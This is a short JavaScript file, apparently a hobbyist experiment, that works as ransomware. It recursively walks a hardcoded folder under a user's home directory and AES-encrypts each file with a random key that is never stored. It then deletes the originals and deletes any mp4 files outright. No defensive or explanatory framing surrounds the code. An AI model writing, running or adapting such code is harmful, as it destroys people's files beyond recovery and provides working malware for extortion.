///////////////////
//extract from me fucking around with javascript.
///////////////////
const fs = require('fs');;
const path = require('path');
const homedirectory = require('os').homedir();
const extension = ".enc";
const crypto = require('crypto-js')
const key = getKey()

function getKey() {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}:<>()*&^%$#@";
    var key = "";
    for (let x = 0;x<120;x++) {key+=chars[Math.floor(Math.random() * chars.length)]}
    return key;
}

function encryptFile(file_path) {
    try {
        if (file_path.endsWith('mp4')) {return fs.unlinkSync(file_path)}
        var fileData = fs.readFileSync(file_path).toString()
        var encdata = crypto.AES.encrypt(fileData, key).toString()
        fs.writeFileSync(file_path+extension, encdata);
        fs.unlinkSync(file_path);
        console.log(`Encrypted: ${file_path}`)
    } catch(err) {
    } 
}
/////////////////////////////////////////////////
function walk(dir, callback) {
	fs.readdir(dir, function(err, files) {
		if (err) throw err;
		files.forEach(function(file) {
			var filepath = path.join(dir, file);
			fs.stat(filepath, function(err,stats) {
				if (stats.isDirectory()) {
					walk(filepath, callback);
				} else if (stats.isFile()) {
					callback(filepath, stats);
				}
			});
		});
	});
}
//totally not from some shit i found since i was too lazy to do it myself

function encryptDirectories() {
    walk("/home/kabion/Downloads/mods/Furry", file => {
        encryptFile(file)
    })
}
